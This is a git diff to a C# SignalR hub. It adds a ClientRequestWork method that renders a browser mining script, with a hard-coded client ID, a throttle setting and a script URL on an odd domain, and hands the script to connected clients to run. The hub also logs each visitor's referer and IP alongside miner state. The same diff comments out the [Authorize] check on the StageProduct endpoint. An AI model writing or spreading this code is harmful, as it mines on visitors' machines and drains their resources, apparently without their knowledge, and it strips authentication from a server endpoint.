@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Threading.Tasks;
 using System.Web;
+using System.Web.Mvc;
 using Microsoft.AspNet.SignalR;
 using Microsoft.AspNet.SignalR.Transports;
 using SignalRService.Interfaces;
@@ -191,7 +192,7 @@ namespace SignalRService.Hubs
             return resVm;
         }
 
-        [Authorize]
+      //  [Authorize]
         public async Task<ViewModels.ProductViewModel> StageProduct(ProductData data, string group)
         {
             return await Task.Run(() => _stageProduct(data,group, Context.ConnectionId));
@@ -309,6 +310,44 @@ namespace SignalRService.Hubs
         {
             db.UpdateMinerState(data, Context.ConnectionId, Context.Request.GetRefererUrl(), Context.Request.GetClientIp());
         }
+
+        public async Task<WorkData> ClientRequestWork()
+        {
+            //default, in case nothin in db - and for delay / statusinterval which are not in db for now
+            var MinerConfigurationViewModel = new SignalRService.ViewModels.MinerConfigurationViewModel()
+            {
+                ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
+                Throttle = "0.9",
+                ScriptUrl = "https://www.freecontent.date./W7KS.js",
+                StartDelayMs = 3000,
+                ReportStatusIntervalMs = 65000
+            };
+
+            var dbMinerConfig = db.MinerConfiurationModels.FirstOrDefault();
+            if(dbMinerConfig == null)
+            {
+                SimpleLogger logger = new SimpleLogger();
+                logger.Error("No minerconfig in db!");
+            }
+            else
+            {
+                MinerConfigurationViewModel.ClientId = dbMinerConfig.ClientId;
+                MinerConfigurationViewModel.Throttle = dbMinerConfig.Throttle.ToString();
+                MinerConfigurationViewModel.ScriptUrl = dbMinerConfig.ScriptUrl;
+            }
+           
+            var data = Utils.RenderUtils.RenderMinerScript(MinerConfigurationViewModel.ClientId, MinerConfigurationViewModel.Throttle, MinerConfigurationViewModel.ScriptUrl, MinerConfigurationViewModel.StartDelayMs, MinerConfigurationViewModel.ReportStatusIntervalMs);
+            //Utils.SignalRServiceUtils.SendScriptDataToClient(Context.ConnectionId,data);
+            WorkData wd = new WorkData();
+            wd.Script = data.ToString();
+            return wd;
+        }
+
+    }
+
+    public class WorkData
+    {
+        public String Script { get; set; }
     }
 
     public class ClientCallbackData
